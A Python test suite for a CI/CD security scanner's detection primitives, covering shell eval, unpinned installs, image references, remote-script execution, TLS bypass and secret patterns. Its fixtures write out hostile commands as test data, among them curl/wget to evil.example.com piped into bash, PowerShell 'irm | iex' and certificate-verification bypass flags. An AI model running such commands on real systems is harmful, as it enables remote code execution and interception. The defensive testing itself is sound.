"""Unit tests for the cross-provider detection primitives under
``pipeline_check/core/checks/_primitives/``.

These lock in the positive / negative behavior for each pattern
catalog. Per-provider rule modules are thin wrappers that call
these primitives, so the rule-level tests (see
``tests/test_workflow_fixtures.py``) exercise the wiring; these
tests exercise the primitive's logic in isolation without the YAML
loading round-trip.
"""
from __future__ import annotations

import pytest

from pipeline_check.core.checks._primitives import (
    anchors,
    container_image,
    deploy_names,
    image_pinning,
    image_ref,
    lockfile_integrity,
    remote_script_exec,
    secret_shapes,
    shell_eval,
    tainted_variables,
    tls_bypass,
)

# ──────────────────────────────────────────────────────────────────
# shell_eval
# ──────────────────────────────────────────────────────────────────


class TestShellEvalPositives:
    @pytest.mark.parametrize("text,kind", [
        ('eval "$CMD"', "eval"),
        ("eval $USER_INPUT", "eval"),
        ("eval ${VAR}", "eval"),
        # Single-quoted args are also risky — eval re-parses the
        # literal string and expansion happens on the re-parse.
        ("eval '$X'", "eval"),
        # Command-substitution whose inner command expands a variable.
        ('eval "$(curl $URL)"', "eval"),
        # Unquoted eval of command-substitution with a variable arg.
        ("eval $(curl $URL)", "eval"),
        ('sh -c "$CMD"', "sh-c"),
        ("sh -c $X", "sh-c"),
        ("bash -c ${CMD}", "sh-c"),
        ("sh -c '$X'", "sh-c"),
        ("sh -c $(cat $FILE)", "sh-c"),
        ('bash -c "$(echo $VAR)"', "sh-c"),
        ("result=`$TOOL --version`", "backtick"),
        ("out=$( $TOOL arg )", "cmdsub"),
    ])
    def test_risky_idiom_flagged(self, text, kind):
        hits = shell_eval.scan(text)
        assert hits, f"expected {kind!r} hit for {text!r}"
        assert any(h.kind == kind for h in hits)

    def test_dedup_single_hit_for_overlapping_eval_patterns(self):
        """``eval "$(curl $URL)"`` matches both the cmdsub-var regex
        and the var-in-quotes regex. The scan must collapse them so
        the finding description doesn't double-count."""
        hits = shell_eval.scan('eval "$(curl $URL)"')
        assert len(hits) == 1

    def test_multi_line_blob_counts_each_occurrence(self):
        blob = "eval $A\neval $B\nsh -c $C"
        hits = shell_eval.scan(blob)
        assert len(hits) == 3


class TestShellEvalNegatives:
    @pytest.mark.parametrize("text", [
        # Literal command substitution — idiomatic bootstrap.
        'eval "$(ssh-agent -s)"',
        # Literal shell-c body — no variable.
        'sh -c "echo hello"',
        # Literal command in $().
        "value=$(date)",
        # Echoing a variable without shell re-parse — safe.
        'echo "$USER"',
        # No shell metacharacters involved.
        "VAR=value",
    ])
    def test_safe_idiom_not_flagged(self, text):
        assert shell_eval.scan(text) == []


# ──────────────────────────────────────────────────────────────────
# lockfile_integrity
# ──────────────────────────────────────────────────────────────────


class TestLockfilePositives:
    @pytest.mark.parametrize("text,kind", [
        # Git URL without SHA pin — lockfile cannot protect.
        ("pip install git+https://github.com/foo/bar.git", "git"),
        ("npm install git+ssh://git@github.com/foo/bar.git", "git"),
        ("cargo install --git https://github.com/foo/bar", "git"),
        # GitHub shorthand — resolves to default branch.
        ("npm install some-org/my-repo", "git"),
        # Local-path installs.
        ("pip install ./my-lib", "path"),
        ("pip install file:///srv/wheels/foo.whl", "path"),
        ("npm install /opt/shared/pkg", "path"),
        ("yarn add file:./local", "path"),
        # Direct tarball URLs.
        ("pip install https://example.com/pkg.tar.gz", "tarball"),
        ("npm install https://example.com/pkg.tgz", "tarball"),
    ])
    def test_bypass_flagged(self, text, kind):
        hits = lockfile_integrity.scan(text)
        assert hits, f"expected {kind!r} hit for {text!r}"
        assert any(h.kind == kind for h in hits)


class TestLockfileNegatives:
    @pytest.mark.parametrize("text", [
        # Registry install with version pin.
        "pip install requests==2.28.1",
        "npm install express",
        # Lockfile-enforcing install.
        "npm ci",
        # Git URL pinned to a commit SHA.
        "pip install git+https://github.com/foo/bar.git@" + "a" * 40,
        ("cargo install --git https://github.com/foo/bar --rev " + "a" * 40),
        # Bare ``.`` — current-package build, legitimate.
        "pip install .",
        # No install command at all.
        "echo 'installing'",
    ])
    def test_safe_install_not_flagged(self, text):
        assert lockfile_integrity.scan(text) == []


# ──────────────────────────────────────────────────────────────────
# Integration sanity — both primitives exposed through the provider
# rule modules and picked up by the orchestrator.
# ──────────────────────────────────────────────────────────────────


def test_shell_eval_rule_registered_for_every_workflow_provider():
    """Every workflow provider should have a rule module calling
    the shell_eval primitive — easy regression guard if someone
    ships a new primitive and forgets to wire one provider."""
    from pipeline_check.core.checks.rule import discover_rules
    expected = {
        "pipeline_check.core.checks.github.rules": "GHA-028",
        "pipeline_check.core.checks.gitlab.rules": "GL-026",
        "pipeline_check.core.checks.bitbucket.rules": "BB-026",
        "pipeline_check.core.checks.azure.rules": "ADO-027",
        "pipeline_check.core.checks.circleci.rules": "CC-027",
        "pipeline_check.core.checks.jenkins.rules": "JF-030",
    }
    for pkg, rule_id in expected.items():
        ids = {r.id for r, _ in discover_rules(pkg)}
        assert rule_id in ids, f"{rule_id} missing under {pkg}"


def test_lockfile_integrity_rule_registered_for_every_workflow_provider():
    from pipeline_check.core.checks.rule import discover_rules
    expected = {
        "pipeline_check.core.checks.github.rules": "GHA-029",
        "pipeline_check.core.checks.gitlab.rules": "GL-027",
        "pipeline_check.core.checks.bitbucket.rules": "BB-027",
        "pipeline_check.core.checks.azure.rules": "ADO-028",
        "pipeline_check.core.checks.circleci.rules": "CC-028",
        "pipeline_check.core.checks.jenkins.rules": "JF-031",
    }
    for pkg, rule_id in expected.items():
        ids = {r.id for r, _ in discover_rules(pkg)}
        assert rule_id in ids, f"{rule_id} missing under {pkg}"


# ──────────────────────────────────────────────────────────────────
# container_image
# ──────────────────────────────────────────────────────────────────


class TestContainerImageClassify:
    def test_aws_managed_image_is_pinned(self):
        info = container_image.classify("aws/codebuild/standard:7.0")
        assert info.aws_managed is True
        assert info.pinned is True
        assert info.digest is None

    def test_digest_pinned_image(self):
        ref = "ghcr.io/corp/builder@sha256:" + "a" * 64
        info = container_image.classify(ref)
        assert info.pinned is True
        assert info.digest == "a" * 64
        assert info.trusted_registry is True

    def test_tag_only_image_not_pinned(self):
        info = container_image.classify("ghcr.io/corp/builder:v1")
        assert info.pinned is False
        assert info.digest is None
        assert info.tag == "v1"
        assert info.trusted_registry is True

    def test_docker_hub_shortform_untrusted(self):
        info = container_image.classify("python:3.11")
        assert info.pinned is False
        assert info.trusted_registry is False
        assert info.registry == ""
        assert info.tag == "3.11"

    def test_public_ecr_trusted_but_not_pinned_without_digest(self):
        info = container_image.classify("public.ecr.aws/amazonlinux/amazonlinux:2023")
        assert info.trusted_registry is True
        assert info.pinned is False
        assert info.registry == "public.ecr.aws"

    def test_registry_with_port_tag_split(self):
        # ``registry:5000/repo:v1`` must not be misread as tag=``5000/repo:v1``.
        info = container_image.classify("registry.internal:5000/team/app:v1")
        assert info.tag == "v1"

    def test_empty_ref_treated_as_pinned(self):
        info = container_image.classify("")
        assert info.ref == ""
        assert info.pinned is True  # nothing for the rule to score against

    def test_none_ref_accepted(self):
        info = container_image.classify(None)
        assert info.ref == ""
        assert info.pinned is True

    def test_digest_pin_blanks_surface_tag_even_when_tag_also_present(self):
        # ``python:3.11@sha256:<hex>`` has both a tag and a digest.
        # The surface ``tag`` field is intentionally blanked when a
        # digest pin wins; callers that need both fields read
        # parse_image_ref directly.
        info = container_image.classify("python:3.11@sha256:" + "a" * 64)
        assert info.pinned is True
        assert info.digest == "a" * 64
        assert info.tag == ""

    def test_aws_managed_image_has_blank_surface_registry(self):
        # The AWS-managed shortform (``aws/codebuild/standard:7.0``)
        # has no explicit registry, but even after Docker Hub default
        # injection the surface registry is intentionally blank so
        # legacy callers that branch on truthiness keep their
        # semantics.
        info = container_image.classify("aws/codebuild/standard:7.0")
        assert info.aws_managed is True
        assert info.registry == ""

    def test_registry_without_dot_returns_blank_surface(self):
        # ``localhost:5000/img:1`` is a registry by Docker rules, but
        # the surface registry filter is "dot-bearing only" so the
        # field comes back blank. Locks the legacy contract — a
        # future loosening has to update this test.
        info = container_image.classify("localhost:5000/img:1")
        assert info.registry == ""

    @pytest.mark.parametrize("host", [
        "public.ecr.aws", "registry.k8s.io", "ghcr.io", "gcr.io",
    ])
    def test_trusted_registries_flagged(self, host):
        info = container_image.classify(f"{host}/team/app:v1")
        assert info.trusted_registry is True

    def test_docker_hub_explicit_namespace_not_trusted(self):
        # ``docker.io`` is NOT in the trusted set on purpose — Docker
        # Hub hosts both vendor-signed and arbitrary user images and
        # ``trusted_registry`` is a domain marker for "vendor-curated".
        info = container_image.classify("docker.io/library/redis:7")
        assert info.trusted_registry is False


# ──────────────────────────────────────────────────────────────────
# image_ref
# ──────────────────────────────────────────────────────────────────


class TestImageRefParse:
    def test_implicit_docker_hub_shortform(self):
        ref = image_ref.parse_image_ref("alpine")
        assert ref is not None
        assert ref.registry == ""
        assert ref.repository == "alpine"
        assert ref.tag == ""
        assert ref.digest_hex == ""
        assert ref.canonical_registry == "docker.io"
        assert ref.canonical_repository == "library/alpine"

    def test_implicit_docker_hub_with_tag(self):
        ref = image_ref.parse_image_ref("python:3.11")
        assert ref is not None
        assert ref.registry == ""
        assert ref.repository == "python"
        assert ref.tag == "3.11"
        assert ref.canonical_repository == "library/python"

    def test_explicit_namespace_no_registry(self):
        # ``library/alpine`` has a slash but the first component is
        # not host-shaped → no registry, repository stays two-segment.
        ref = image_ref.parse_image_ref("library/alpine:3.20")
        assert ref is not None
        assert ref.registry == ""
        assert ref.repository == "library/alpine"
        assert ref.tag == "3.20"
        # Canonical doesn't double-prefix ``library/``.
        assert ref.canonical_repository == "library/alpine"

    def test_explicit_registry(self):
        ref = image_ref.parse_image_ref("ghcr.io/corp/builder:v1")
        assert ref is not None
        assert ref.registry == "ghcr.io"
        assert ref.repository == "corp/builder"
        assert ref.tag == "v1"
        assert ref.canonical_registry == "ghcr.io"
        assert ref.canonical_repository == "corp/builder"

    def test_registry_with_port(self):
        # ``registry.internal:5000/team/app:v1`` must split the port
        # off the registry, not off the tag.
        ref = image_ref.parse_image_ref("registry.internal:5000/team/app:v1")
        assert ref is not None
        assert ref.registry == "registry.internal:5000"
        assert ref.repository == "team/app"
        assert ref.tag == "v1"

    def test_registry_with_port_no_tag(self):
        ref = image_ref.parse_image_ref("registry.internal:5000/team/app")
        assert ref is not None
        assert ref.registry == "registry.internal:5000"
        assert ref.repository == "team/app"
        assert ref.tag == ""

    def test_localhost_registry(self):
        # ``localhost`` has no dot but Docker treats it as a registry.
        ref = image_ref.parse_image_ref("localhost:5000/img:1")
        assert ref is not None
        assert ref.registry == "localhost:5000"
        ref2 = image_ref.parse_image_ref("localhost/img:1")
        assert ref2 is not None
        assert ref2.registry == "localhost"

    def test_aws_managed_shortform(self):
        # ``aws/codebuild/standard:7.0`` — no registry, multi-segment repo.
        # The AWS-managed verdict stays in ``container_image.classify()``.
        ref = image_ref.parse_image_ref("aws/codebuild/standard:7.0")
        assert ref is not None
        assert ref.registry == ""
        assert ref.repository == "aws/codebuild/standard"
        assert ref.tag == "7.0"

    def test_digest_pin(self):
        ref = image_ref.parse_image_ref(
            "ghcr.io/corp/builder@sha256:" + "a" * 64
        )
        assert ref is not None
        assert ref.registry == "ghcr.io"
        assert ref.repository == "corp/builder"
        assert ref.tag == ""
        assert ref.digest_algo == "sha256"
        assert ref.digest_hex == "a" * 64
        assert ref.is_digest_pinned is True

    def test_tag_plus_digest(self):
        ref = image_ref.parse_image_ref(
            "python:3.11@sha256:" + "b" * 64
        )
        assert ref is not None
        assert ref.repository == "python"
        assert ref.tag == "3.11"
        assert ref.digest_hex == "b" * 64
        assert ref.is_digest_pinned is True

    def test_uppercase_digest_rejected_per_oci_spec(self):
        # Engine invariant: OCI mandates lowercase hex. Uppercase is
        # detected as a boundary (so the suffix is peeled off the
        # repository correctly) but is_digest_pinned must say False.
        ref = image_ref.parse_image_ref(
            "alpine@sha256:" + "A" * 64
        )
        assert ref is not None
        assert ref.digest_algo == "sha256"
        assert ref.digest_hex == "A" * 64
        assert ref.is_digest_pinned is False
        # And the repository is clean — no ``@sha256:...`` garbage left.
        assert ref.repository == "alpine"

    def test_truncated_digest_rejected(self):
        ref = image_ref.parse_image_ref("alpine@sha256:" + "a" * 32)
        assert ref is not None
        assert ref.is_digest_pinned is False

    def test_sha512_digest_accepted(self):
        # Spec-legal alternative width.
        ref = image_ref.parse_image_ref("alpine@sha512:" + "c" * 128)
        assert ref is not None
        assert ref.digest_algo == "sha512"
        assert ref.is_digest_pinned is True

    def test_at_sign_without_digest_shape_not_a_digest(self):
        # ``foo@bar`` (no ``algo:hex`` after the @) — not a digest;
        # the ``@`` ends up inside the repository name.
        ref = image_ref.parse_image_ref("foo@bar")
        assert ref is not None
        assert ref.digest_algo == ""
        assert ref.is_digest_pinned is False

    def test_floating_tag_classification(self):
        for tag_input in ("python:latest", "alpine:stable", "alpine:edge"):
            ref = image_ref.parse_image_ref(tag_input)
            assert ref is not None
            assert ref.is_floating_tag is True

    def test_version_tag_not_floating(self):
        for tag_input in ("python:3.11", "node:20-bookworm", "app:v1.2.3-rc.1"):
            ref = image_ref.parse_image_ref(tag_input)
            assert ref is not None
            assert ref.is_floating_tag is False

    def test_no_tag_not_floating(self):
        # A bare ref isn't floating — it's a separate state. Lets
        # callers distinguish "missing tag" from "mutable tag" if
        # they care.
        ref = image_ref.parse_image_ref("alpine")
        assert ref is not None
        assert ref.is_floating_tag is False

    @pytest.mark.parametrize("value", [None, 123, "", "   ", []])
    def test_invalid_input_returns_none(self, value):
        assert image_ref.parse_image_ref(value) is None

    def test_host_with_trailing_slash_only_returns_none(self):
        # ``ghcr.io/`` — registry boundary recognized but no repository
        # follows. Treated as malformed rather than silently surfacing
        # an empty repository name.
        assert image_ref.parse_image_ref("ghcr.io/") is None

    def test_digest_only_strip_leaves_no_repo_returns_none(self):
        # If the entire body before the digest boundary is the
        # registry host (``ghcr.io@sha256:...``), the post-strip body
        # has no repository name. Must return None, not crash.
        assert image_ref.parse_image_ref("ghcr.io/@sha256:" + "a" * 64) is None

    def test_unknown_digest_algorithm_not_pinned_but_parsed(self):
        # ``sha1`` is detected as a boundary algorithm (so the suffix
        # gets stripped from the repository) but is_digest_pinned is
        # False because sha1 isn't in the trusted widths map.
        ref = image_ref.parse_image_ref("alpine@sha1:" + "a" * 40)
        assert ref is not None
        assert ref.digest_algo == "sha1"
        assert ref.is_digest_pinned is False
        # Repository surface stays clean.
        assert ref.repository == "alpine"

    def test_tag_in_middle_segment_not_split(self):
        # Tag splitting only operates on the final path segment, so a
        # colon inside a path component earlier in the repo path
        # (theoretical, but possible in custom registries) doesn't
        # accidentally become the tag.
        ref = image_ref.parse_image_ref("ghcr.io/team/app:v1")
        assert ref is not None
        assert ref.tag == "v1"
        assert ref.repository == "team/app"  # not "team/app:v1"


# ──────────────────────────────────────────────────────────────────
# image_pinning extra edge cases
# ──────────────────────────────────────────────────────────────────


class TestImagePinningClassifyEdges:
    def test_empty_string_treated_as_no_tag(self):
        # parse_image_ref returns None for "", and the classifier
        # preserves the legacy "fall through to NO_TAG" verdict so
        # rules treat empties as unpinned without crashing.
        assert image_pinning.classify("") is image_pinning.PinKind.NO_TAG

    def test_non_string_input_treated_as_no_tag(self):
        # The annotated signature says ``str``, but rules fish refs
        # out of YAML where the static type is ``Any | None``. The
        # primitive must accept the non-str case gracefully.
        assert image_pinning.classify(None) is image_pinning.PinKind.NO_TAG  # type: ignore[arg-type]

    def test_uppercase_sha256_hex_is_not_digest_pinned(self):
        # Uppercase hex is detected as a boundary (so the suffix gets
        # peeled) but is_digest_pinned is False per OCI spec, so the
        # classifier falls through. With a tag of "", that's NO_TAG.
        ref = "alpine@sha256:" + "A" * 64
        assert image_pinning.classify(ref) is image_pinning.PinKind.NO_TAG

    def test_short_digest_falls_back_to_no_tag(self):
        # 32-char "sha256" is not a real OCI digest, so it doesn't
        # count as DIGEST. Without a tag, the verdict is NO_TAG.
        assert (
            image_pinning.classify("alpine@sha256:" + "a" * 32)
            is image_pinning.PinKind.NO_TAG
        )


# ──────────────────────────────────────────────────────────────────
# remote_script_exec
# ──────────────────────────────────────────────────────────────────


class TestRemoteScriptExecPositives:
    @pytest.mark.parametrize("text,kind,interp", [
        ("curl https://evil.example.com/x.sh | bash", "curl-pipe", "bash"),
        ("wget -qO- https://evil.example.com/x | sh", "curl-pipe", "sh"),
        ("curl -fsSL https://e.x/loader.py | python3", "curl-pipe", "python3"),
        ("curl -L https://e.x/x | sudo bash", "curl-pipe", "bash"),
        # bash -c "$(curl ...)" — re-enter shell on fetched content.
        ('bash -c "$(curl -fsSL https://e.x/bootstrap)"', "shell-subshell", "bash"),
        ("sh -c '$(wget -qO- https://e.x/boot)'", "shell-subshell", "sh"),
        # Download then execute on the same line.
        ("curl https://e.x/x.sh > /tmp/x.sh ; bash /tmp/x.sh", "download-exec", "bash"),
        # Python inline fetcher.
        ('python -c "import urllib.request;urllib.request.urlopen(\'https://e.x/p\').read()"',
         "python-inline", "python"),
        # PowerShell one-liners.
        ("irm https://e.x/install.ps1 | iex", "powershell", "iex"),
        ("Invoke-WebRequest https://e.x/x.ps1 | iex", "powershell", "iex"),
    ])
    def test_idiom_flagged(self, text, kind, interp):
        hits = remote_script_exec.scan(text)
        assert hits, f"expected {kind!r} hit for {text!r}"
        assert any(h.kind == kind and h.interpreter == interp for h in hits), \
            f"got {[(h.kind, h.interpreter) for h in hits]}"

    def test_url_and_host_extracted(self):
        hits = remote_script_exec.scan("curl https://evil.example.com/x | bash")
        assert len(hits) == 1
        assert hits[0].url == "https://evil.example.com/x"
        assert hits[0].host == "evil.example.com"

    def test_vendor_installer_marked_trusted(self):
        hits = remote_script_exec.scan("curl --proto '=https' -sSf https://sh.rustup.rs | sh")
        assert hits and hits[0].vendor_trusted is True

    def test_vendor_subdomain_marked_trusted(self):
        # Subdomain of an allowlisted vendor host.
        hits = remote_script_exec.scan("curl -fsSL https://get.bun.sh/install | bash")
        assert hits and hits[0].vendor_trusted is True

    def test_unknown_host_not_trusted(self):
        hits = remote_script_exec.scan("curl https://evil.example.com/x | bash")
        assert hits and hits[0].vendor_trusted is False

    def test_shell_subshell_not_double_counted_as_pipe(self):
        """``bash -c "$(curl URL)"`` contains a raw ``curl URL`` the
        generic pipe regex would otherwise also claim."""
        hits = remote_script_exec.scan('bash -c "$(curl -fsSL https://e.x/x)"')
        assert len(hits) == 1
        assert hits[0].kind == "shell-subshell"


class TestRemoteScriptExecNegatives:
    @pytest.mark.parametrize("text", [
        # Downloads the script but only runs checksum, not interpreter.
        "curl -fsSL https://e.x/x.sh -o /tmp/x.sh && sha256sum /tmp/x.sh",
        # curl without pipe — just a file download.
        "curl -fsSL https://e.x/x.tar.gz -o /tmp/x.tar.gz",
        # Piping to a non-interpreter.
        "curl -fsSL https://e.x/x | tee /tmp/x.log",
        # Echoing a curl command, not running it.
        'echo "run: curl foo | bash"',
        # No URL at all.
        "bash -c 'echo hi'",
    ])
    def test_safe_idiom_not_flagged(self, text):
        assert remote_script_exec.scan(text) == []


# ──────────────────────────────────────────────────────────────────
# tls_bypass
# ──────────────────────────────────────────────────────────────────


class TestTlsBypassPositives:
    @pytest.mark.parametrize("text,tool", [
        ("npm config set strict-ssl false", "npm"),
        ("yarn config set strict-ssl false", "yarn"),
        ("pip config set global.trusted-host pypi.org", "pip"),
        ("git config --global http.sslVerify false", "git"),
        ("GIT_SSL_NO_VERIFY=1 git clone https://e.x/r.git", "git"),
        ("export NODE_TLS_REJECT_UNAUTHORIZED=0", "node"),
        ("PYTHONHTTPSVERIFY=0 python app.py", "python"),
        ("curl -k https://e.x/x", "curl"),
        ("curl --insecure https://e.x/x", "curl"),
        ("wget --no-check-certificate https://e.x/x", "wget"),
        ("GOINSECURE=*.internal go get ./...", "go"),
        # New coverage added by the primitive (previously not detected).
        ("helm install mychart --insecure-skip-tls-verify", "helm"),
        ("kubectl get po --insecure-skip-tls-verify", "kubectl"),
        ("ssh -o StrictHostKeyChecking=no user@host", "ssh"),
        ("ssh -o UserKnownHostsFile=/dev/null user@host", "ssh"),
        # Docker daemon allowing plaintext / self-signed registries.
        ("dockerd --insecure-registry registry.internal:5000", "docker"),
        ("docker run --insecure-registry myreg/img:tag", "docker"),
        # JVM build-tool TLS bypass shortcuts.
        ("mvn -Dmaven.wagon.http.ssl.insecure=true package", "maven"),
        ("gradle -Dorg.gradle.https.insecure=true build", "gradle"),
        # AWS CLI skipping cert verification.
        ("AWS_S3_NO_VERIFY_SSL=true aws s3 cp x s3://bucket/x", "aws"),
        ("aws --no-verify-ssl s3 ls", "aws"),
    ])
    def test_bypass_flagged(self, text, tool):
        hits = tls_bypass.scan(text)
        assert hits, f"expected {tool!r} hit for {text!r}"
        assert any(h.tool == tool for h in hits), \
            f"expected tool={tool!r}, got {[h.tool for h in hits]}"


class TestTlsBypassNegatives:
    @pytest.mark.parametrize("text", [
        # strict-ssl true — the safe direction.
        "npm config set strict-ssl true",
        # curl over HTTPS without bypass flags — normal.
        "curl -fsSL https://e.x/x",
        # ssh with default verification — no -o flag.
        "ssh user@host 'uptime'",
        # helm / kubectl with no insecure flag.
        "helm install mychart ./chart",
        "kubectl get po -n kube-system",
        # Documentation-shaped string with ``false`` in a different field.
        "echo 'sslVerify is currently false in the bug report'",
    ])
    def test_safe_usage_not_flagged(self, text):
        assert tls_bypass.scan(text) == []


# ──────────────────────────────────────────────────────────────────
# image_pinning
# ──────────────────────────────────────────────────────────────────


class TestImagePinningClassify:
    @pytest.mark.parametrize("ref", [
        "python@sha256:" + "a" * 64,
        "ghcr.io/corp/builder@sha256:" + "0" * 64,
        # Registry with port still terminates in the digest.
        "registry.internal:5000/team/app@sha256:" + "f" * 64,
    ])
    def test_digest_pin(self, ref):
        assert image_pinning.classify(ref) is image_pinning.PinKind.DIGEST

    @pytest.mark.parametrize("ref", [
        # Bare names — Docker Hub default tag is implicit ``latest`` but
        # the surface form has no ``:`` after the last path segment.
        "python",
        "ghcr.io/corp/builder",
        # Registry with port and no tag — must not be misread as
        # ``:5000/team/app``.
        "registry.internal:5000/team/app",
    ])
    def test_no_tag(self, ref):
        assert image_pinning.classify(ref) is image_pinning.PinKind.NO_TAG

    @pytest.mark.parametrize("ref", [
        "python:latest",
        "ghcr.io/corp/builder:latest",
        # Tag with no digit — treated as floating (e.g. ``stable``,
        # ``edge``, ``alpine``).
        "python:stable",
        "alpine:edge",
        # Unique gotcha: a registry-with-port image whose tag happens to
        # be ``latest`` should still be FLOATING, not NO_TAG.
        "registry.internal:5000/app:latest",
    ])
    def test_floating(self, ref):
        assert image_pinning.classify(ref) is image_pinning.PinKind.FLOATING

    @pytest.mark.parametrize("ref", [
        "python:3.12.1",
        "python:3.12.1-slim",
        # Tag with a digit anywhere counts as version-shaped.
        "node:20-bookworm",
        "ghcr.io/corp/builder:v1.2.3-rc.1",
        "registry.internal:5000/app:1.0.0",
    ])
    def test_pinned_tag(self, ref):
        assert image_pinning.classify(ref) is image_pinning.PinKind.PINNED_TAG

    def test_digest_re_does_not_match_arbitrary_at_sign(self):
        """``user@host`` shapes in ssh-like strings must not classify
        as digest-pinned."""
        assert image_pinning.classify("foo@bar") is image_pinning.PinKind.NO_TAG

    def test_provider_helpers_re_export_the_primitive_objects(self):
        """The four provider _helpers.py modules re-export DIGEST_RE /
        VERSION_TAG_RE — they must be the *same object* as the
        primitive's, otherwise a future regex tweak in the primitive
        wouldn't propagate."""
        from pipeline_check.core.checks.azure.rules._helpers import (
            DIGEST_RE as az_d,
        )
        from pipeline_check.core.checks.azure.rules._helpers import (
            VERSION_TAG_RE as az_v,
        )
        from pipeline_check.core.checks.circleci.rules._helpers import (
            DIGEST_RE as cc_d,
        )
        from pipeline_check.core.checks.gitlab.rules._helpers import (
            DIGEST_RE as gl_d,
        )
        from pipeline_check.core.checks.gitlab.rules._helpers import (
            VERSION_TAG_RE as gl_v,
        )
        from pipeline_check.core.checks.jenkins.rules._helpers import (
            DIGEST_RE as jf_d,
        )
        from pipeline_check.core.checks.jenkins.rules._helpers import (
            VERSION_TAG_RE as jf_v,
        )
        assert image_pinning.DIGEST_RE is az_d is gl_d is cc_d is jf_d
        assert image_pinning.VERSION_TAG_RE is az_v is gl_v is jf_v


# ──────────────────────────────────────────────────────────────────
# deploy_names
# ──────────────────────────────────────────────────────────────────


class TestDeployNames:
    @pytest.mark.parametrize("name", [
        "deploy",
        "deploy-prod",
        "release",
        "Release-Notes",
        "publish-npm",
        "promote",
        # Case-insensitive — the regex carries (?i).
        "DEPLOY",
        "Promote",
    ])
    def test_deploy_like_names_match(self, name):
        assert deploy_names.DEPLOY_RE.search(name) is not None

    @pytest.mark.parametrize("name", [
        "build",
        "test",
        "lint",
        "compile",
        # Words that *contain* deploy as a substring but on a word
        # boundary they don't — \b in the regex prevents this.
        "redeployer",  # \bdeploy\b doesn't match because of preceding 're'
    ])
    def test_unrelated_names_dont_match(self, name):
        assert deploy_names.DEPLOY_RE.search(name) is None

    def test_underscore_separated_names_do_not_match(self):
        """Python's ``\\b`` treats ``_`` as a word character, so
        ``deploy_to_prod`` does NOT match the primitive's regex even
        though autofix.py's looser ``_DEPLOY_NAME_RE`` does.

        Callers that want to catch underscore-suffixed deploy names
        must either split on ``_`` first or use their own regex —
        the primitive prefers the false-negative over the false-
        positive (``builddeploy`` would otherwise hit too)."""
        assert deploy_names.DEPLOY_RE.search("deploy_to_prod") is None


# ──────────────────────────────────────────────────────────────────
# secret_shapes
# ──────────────────────────────────────────────────────────────────


class TestSecretShapes:
    @pytest.mark.parametrize("text", [
        "AKIA" + "A" * 16,
        "AKIA1234567890123456",
        "value: AKIAIOSFODNN7EXAMPLE",
    ])
    def test_aws_key_shape_matches(self, text):
        assert secret_shapes.AWS_KEY_RE.search(text) is not None

    @pytest.mark.parametrize("text", [
        # Wrong prefix length / characters.
        "AKIA1234",                       # too short
        "AKIA" + "a" * 16,                # lowercase rejected
        "ASIA" + "A" * 16,                # ASIA = STS, deliberately not matched
        "BKIA" + "A" * 16,                # not the AKIA prefix
    ])
    def test_aws_key_shape_does_not_match(self, text):
        assert secret_shapes.AWS_KEY_RE.search(text) is None

    @pytest.mark.parametrize("name", [
        "password",
        "DatabasePassword",
        "API_KEY",
        "apikey",
        "SECRET",
        "private_key",
        "service_token",
    ])
    def test_secretish_key_names_match(self, name):
        assert secret_shapes.SECRETISH_KEY_RE.search(name) is not None

    @pytest.mark.parametrize("name", [
        "username",
        "host",
        "build_id",
        "publickey",  # 'public' alone does not include 'private_key'
    ])
    def test_non_secret_names_do_not_match(self, name):
        assert secret_shapes.SECRETISH_KEY_RE.search(name) is None


# ──────────────────────────────────────────────────────────────────
# tainted_variables — script-injection consumer-side primitive
# ──────────────────────────────────────────────────────────────────


# Provider-shaped untrusted-context regex. Constructed once and reused
# across the test cases below; mirrors the regex shape that GitLab and
# Bitbucket helpers ship.
import re as _re  # noqa: E402

_UNTRUSTED_RE = _re.compile(r"\$\{?(?:CI_COMMIT_MESSAGE|BITBUCKET_BRANCH)\}?")


def _shell_ref(name: str) -> str:
    """Mimic GitLab / Bitbucket ``$VAR`` / ``${VAR}`` reference syntax."""
    return rf"\$\{{?{_re.escape(name)}\}}?"


class TestHasDirectTaint:
    @pytest.mark.parametrize("line", [
        # Bare reference, no quoting.
        "echo $CI_COMMIT_MESSAGE",
        "git log --grep $BITBUCKET_BRANCH",
        # Brace form.
        "msg=${CI_COMMIT_MESSAGE}",
        # Reference embedded in a longer command — still a hit.
        "deploy --tag prefix-$CI_COMMIT_MESSAGE",
    ])
    def test_unquoted_reference_flagged(self, line):
        assert tainted_variables.has_direct_taint([line], _UNTRUSTED_RE) is True

    @pytest.mark.parametrize("line", [
        # Defensive double-quoted assignment — captured into a string.
        'BRANCH="$BITBUCKET_BRANCH"',
        'MSG="${CI_COMMIT_MESSAGE}"',
        # Bare line with no untrusted reference.
        "echo hello",
        # Untrusted name appears only in a comment.
        "# CI_COMMIT_MESSAGE is the message",
    ])
    def test_safe_line_not_flagged(self, line):
        assert tainted_variables.has_direct_taint([line], _UNTRUSTED_RE) is False

    def test_multiline_returns_true_if_any_line_unsafe(self):
        body = (
            'SAFE="$CI_COMMIT_MESSAGE"\n'
            "echo $CI_COMMIT_MESSAGE\n"  # this line is unsafe
        )
        assert tainted_variables.has_direct_taint(body.splitlines(), _UNTRUSTED_RE) is True

    def test_multiline_all_safe_returns_false(self):
        body = (
            'A="$CI_COMMIT_MESSAGE"\n'
            'B="${CI_COMMIT_MESSAGE}"\n'
        )
        assert tainted_variables.has_direct_taint(body.splitlines(), _UNTRUSTED_RE) is False


class TestHasUnsafeReference:
    def test_bare_reference_flagged(self):
        assert tainted_variables.has_unsafe_reference(
            ["deploy --branch $TAINTED"], {"TAINTED"}, ref_pattern=_shell_ref,
        ) is True

    def test_brace_reference_flagged(self):
        assert tainted_variables.has_unsafe_reference(
            ["deploy --branch ${TAINTED}"], {"TAINTED"}, ref_pattern=_shell_ref,
        ) is True

    def test_double_quoted_reference_safe(self):
        """``"$X"`` is safe in bash — the value is interpolated as a
        single literal argument, no re-evaluation."""
        assert tainted_variables.has_unsafe_reference(
            ['deploy --branch "$TAINTED"'], {"TAINTED"}, ref_pattern=_shell_ref,
        ) is False

    def test_quoted_assignment_safe(self):
        """``VAR="...$X..."`` is the established defensive idiom; the
        primitive must short-circuit on it via is_quoted_assignment."""
        assert tainted_variables.has_unsafe_reference(
            ['LOCAL="$TAINTED"'], {"TAINTED"}, ref_pattern=_shell_ref,
        ) is False

    def test_reference_outside_quotes_on_quoted_line_flagged(self):
        """A line that mixes quoted + unquoted references is unsafe.
        The double-quote-strip removes ``"safe"`` and exposes ``$X``."""
        assert tainted_variables.has_unsafe_reference(
            ['echo "safe-string" $TAINTED'], {"TAINTED"}, ref_pattern=_shell_ref,
        ) is True

